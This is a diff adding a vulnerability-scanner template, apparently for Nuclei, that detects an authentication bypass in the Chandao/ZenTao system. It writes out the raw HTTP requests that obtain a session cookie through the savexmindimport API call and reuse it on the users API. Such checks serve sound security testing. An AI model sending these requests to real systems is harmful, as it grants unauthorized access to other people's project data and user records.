@@ -1,0 +1,35 @@
+id: chandao-system-BypassVulnerability
+
+info:
+  name: chandao-system-BypassVulnerability
+  author: HackTwo
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=hxsjoqkyiveutbzwlvjv&branch=rbpcotcxawqpqhvhqfpp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Connection: close
+      - |
+        GET /api.php/v1/users HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Cookie: {{session}}
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: session
+        part: header
+        internal: true 
+        #group: 0
+        regex:     
+          - "zentaosid=.*HttpOnly"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "no company-browse priv"
+
